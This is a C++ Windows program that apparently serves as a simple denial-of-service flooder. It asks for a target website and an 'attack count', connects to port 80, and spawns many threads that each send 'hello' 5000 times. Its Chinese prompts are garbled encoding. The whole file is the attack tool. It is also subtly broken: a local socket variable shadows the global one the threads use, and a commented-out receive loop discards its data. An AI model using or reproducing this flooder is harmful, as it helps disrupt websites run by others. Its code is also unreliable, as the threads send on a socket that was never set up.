#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <WinSock2.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")
DWORD WINAPI wordProc(LPVOID lpParm);
SOCKET sockclient;
int main() {
	char url[200];
	printf("�������⼦�������ӣ�\n");
	scanf_s("%s", url);
	int n;
	printf("�����빥��������\n");
	scanf_s("%d",&n);

	WSADATA wd;
	if (0 != (WSAStartup(MAKEWORD(2, 2), &wd)))
	{
		printf("��ʼ������ʧ��.\n");
			return 0;
	}
	if (LOBYTE(wd.wVersion) != 2 || HIBYTE(wd.wVersion) != 2)
	{
		printf("����İ汾��ʵ�ʼ��ذ汾��һ��.\n");
		return 0;
	}
	SOCKET sockclient = socket(AF_INET,SOCK_STREAM,0);
	if(sockclient == INVALID_SOCKET)
	{
		printf("�����׽���ʧ��.\n");
		return 0;
	}
	else {
		printf("������.\n");
	}//www.baidu.com
	hostent* host = gethostbyname(url);
	if (host == NULL) {
		printf("��������ʧ��.\n");
		return 0;
	}
	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(80);
	memcpy(&sa.sin_addr, host->h_addr, 4);
	if(SOCKET_ERROR == connect(sockclient,(sockaddr*)&sa,sizeof(sockaddr)))
	{
		printf("������վʧ��.\n");
	}

	/*char sendBuf[250] = { 0 };
	sprintf(sendBuf,"Hello wolrd\r\n\r\n");
	char recvBuf[512] = { 0 };
	if (NULL == (send(sockclient, sendBuf, strlen(sendBuf), 0)));
	{
		printf("send error!");
	}
	char ch = '\0';
	std::string str;
	while (recv(sockclient, recvBuf, sizeof(recvBuf), 0))
	{
		str += ch;
	}
	printf("%s\n",str.c_str());*/
	
	int i = 0;
	char sendBuf[250] = "hello\r\n\r\n";
	while (i < n)
	{
		
		CreateThread(NULL, 0,wordProc,0,0,NULL);
		i++;
	}
	system("pause");
	return 0;
}
DWORD WINAPI wordProc(LPVOID lpParm) {
	int i = 0;
	while (i < 5000)
	{
		printf("������:%d��\n", i);
		char sendBuf[250] = "hello";
		send(sockclient, sendBuf, strlen(sendBuf), 0);
		i++;
	}
	
return 0;
}